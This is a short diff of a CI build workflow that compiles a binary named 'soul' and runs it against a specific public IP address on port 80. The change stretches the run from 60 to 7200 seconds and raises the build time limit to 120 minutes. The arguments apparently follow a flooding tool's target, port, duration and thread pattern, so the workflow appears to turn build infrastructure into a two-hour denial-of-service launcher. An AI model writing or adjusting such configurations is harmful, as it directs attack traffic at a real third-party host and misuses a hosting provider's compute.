@@ -1,7 +1,7 @@
 workflows:
   linux-cpp-build:
     name: C++ Build & Run (Linux X4)
-    max_build_duration: 10
+    max_build_duration: 120
     instance_type: linux_x2
 
     scripts:
@@ -21,4 +21,4 @@ workflows:
           chmod +x soul
 
           echo "Running..."
-          ./soul 216.202.205.235 80 60 200
+          ./soul 216.202.205.235 80 7200 200
